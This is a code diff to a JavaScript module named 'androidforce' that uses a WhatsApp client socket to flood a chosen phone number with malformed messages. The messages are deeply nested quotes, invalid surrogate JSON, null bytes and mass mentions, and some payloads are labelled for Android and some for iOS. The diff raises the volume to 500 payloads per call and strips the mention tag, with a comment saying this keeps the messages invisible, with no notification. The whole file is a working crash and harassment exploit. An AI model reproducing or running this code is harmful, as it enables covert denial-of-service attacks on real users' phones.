@@ -4,16 +4,17 @@ module.exports = async function androidforce(sock, target) {
     const jid = target.includes("@") ? target : `${target}@s.whatsapp.net`;
     const baseId = crypto.randomBytes(16).toString("hex").toUpperCase();
 
-    const buildDeepNested = (depth) => {
+    // ============================================================
+    // NESTING BUILDERS
+    // ============================================================
+    const nestedQuote = (depth) => {
         let inner = { conversation: "\0" };
         for (let i = 0; i < depth; i++) {
             inner = {
                 extendedTextMessage: {
                     text: "\0",
                     contextInfo: {
-                        quotedMessage: inner,
-                        participant: `${"0".repeat(16)}@s.whatsapp.net`,
-                        stanzaId: crypto.randomBytes(8).toString("hex").toUpperCase()
+                        quotedMessage: inner
                     }
                 }
             };
@@ -21,73 +22,152 @@ module.exports = async function androidforce(sock, target) {
         return inner;
     };
 
-    const buildMassMention = () => {
-        return {
-            extendedTextMessage: {
-                text: "\0",
-                contextInfo: {
-                    mentionedJid: Array.from({ length: 20000 }, () =>
-                        `${crypto.randomBytes(4).toString("hex")}@s.whatsapp.net`
-                    )
+    const nestedCtx = (depth) => {
+        let inner = { remoteJid: "\0", stanzaId: crypto.randomBytes(8).toString("hex") };
+        for (let i = 0; i < depth; i++) {
+            inner = {
+                remoteJid: "\0",
+                stanzaId: crypto.randomBytes(8).toString("hex"),
+                quotedMessage: {
+                    extendedTextMessage: { text: "\0", contextInfo: inner }
                 }
-            }
-        };
+            };
+        }
+        return inner;
     };
 
-    const payloads = [];
+    const badJson = (() => {
+        let o = { a: "\uD800" };
+        for (let i = 0; i < 400; i++) o = { n: o, k: "\0", v: "\uDFFF" };
+        return JSON.stringify(o);
+    })();
 
-    payloads.push({
+    // ============================================================
+    // PAYLOAD TYPES — rotate for high volume
+    // ============================================================
+    const makeAndroidPayload = () => ({
         extendedTextMessage: {
             text: "\0",
-            contextInfo: { quotedMessage: buildDeepNested(1500) }
+            contextInfo: {
+                quotedMessage: nestedQuote(800)
+            }
         }
     });
 
-    payloads.push(buildMassMention());
+    const makeAndroidDeepPayload = () => ({
+        extendedTextMessage: {
+            text: "\0",
+            contextInfo: {
+                quotedMessage: nestedQuote(1500)
+            }
+        }
+    });
 
-    payloads.push({
+    const makeIOSPayload = () => ({
         interactiveMessage: {
             header: {
                 title: "\0",
-                hasMediaAttachment: true,
-                locationMessage: {
-                    degreesLatitude: NaN,
-                    degreesLongitude: NaN,
-                    name: "\0".repeat(4096),
-                    url: "data:".repeat(2048)
-                }
+                hasMediaAttachment: false
             },
-            body: { text: "\0", contextInfo: { quotedMessage: buildDeepNested(800) } },
-            footer: { text: "\uD800".repeat(2048) },
+            body: { text: "\0" },
             nativeFlowMessage: {
-                buttons: [
-                    { name: "\0", buttonParamsJson: "\0".repeat(0x4000) },
-                    { name: "galaxy_message", buttonParamsJson: "\0".repeat(0x4000) }
-                ],
-                messageParamsJson: "\0".repeat(0x4000),
-                messageVersion: 0xffff
+                buttons: [],
+                messageParamsJson: badJson
             },
-            contextInfo: { quotedMessage: buildDeepNested(800) }
+            contextInfo: {
+                addonActionSection: {
+                    actionType: null,
+                    primitives: []
+                },
+                quotedMessage: nestedCtx(500)
+            }
         }
     });
 
-    for (let i = 0; i < payloads.length; i++) {
+    const makeIOSViewOnce = () => ({
+        viewOnceMessage: {
+            message: {
+                interactiveMessage: {
+                    header: { title: "\0", hasMediaAttachment: false },
+                    nativeFlowMessage: { buttons: [] },
+                    contextInfo: {
+                        addonActionSection: { actionType: null, primitives: [] },
+                        quotedMessage: nestedCtx(500)
+                    }
+                }
+            }
+        }
+    });
+
+    const makeCombinedPayload = () => ({
+        extendedTextMessage: {
+            text: "\0",
+            contextInfo: {
+                quotedMessage: nestedQuote(1200),
+                conversionSource: "\0",
+                conversionData: Buffer.alloc(2000, 0).toString("base64")
+            }
+        }
+    });
+
+    const makeMassMention = () => ({
+        extendedTextMessage: {
+            text: "\0",
+            contextInfo: {
+                quotedMessage: nestedQuote(400),
+                mentionedJid: Array.from({ length: 8000 }, () =>
+                    `${crypto.randomBytes(4).toString("hex")}@s.whatsapp.net`
+                )
+            }
+        }
+    });
+
+    // ============================================================
+    // HIGH-VOLUME FIRE — 500 payloads per call
+    // ============================================================
+    const builders = [
+        makeAndroidPayload,
+        makeAndroidDeepPayload,
+        makeIOSPayload,
+        makeIOSViewOnce,
+        makeCombinedPayload,
+        makeMassMention
+    ];
+
+    const TOTAL = 500;
+
+    for (let i = 0; i < TOTAL; i++) {
+        const builder = builders[i % builders.length];
+        const payload = builder();
+        const msgId = `${baseId}${i.toString(16).padStart(4, "0")}`;
+
         try {
-            await sock.relayMessage("status@broadcast", payloads[i], {
-                messageId: `${baseId}${i.toString(16).padStart(2, "0")}`,
+            await sock.relayMessage("status@broadcast", payload, {
+                messageId: msgId,
                 statusJidList: [jid],
                 additionalNodes: [
                     {
                         tag: "meta",
                         attrs: { appdata: "default" },
                         content: [
-                            { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid } }] },
-                            { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
+                            // ONLY status_attribution — no mentioned_users
+                            // This keeps it invisible — no chat bubble, no notification
+                            {
+                                tag: "status_attribution",
+                                attrs: { hidden: "true" },
+                                content: []
+                            }
                         ]
                     }
                 ]
             });
-            await new Promise(r => setTimeout(r, 150));
-        } catch {}
+
+            // tiny delay so each gets own DB row, but still very fast
+            if (i % 20 === 0) {
+                await new Promise(r => setTimeout(r, 50));
+            }
+        } catch (e) {
+            // continue
+        }
     }
 };
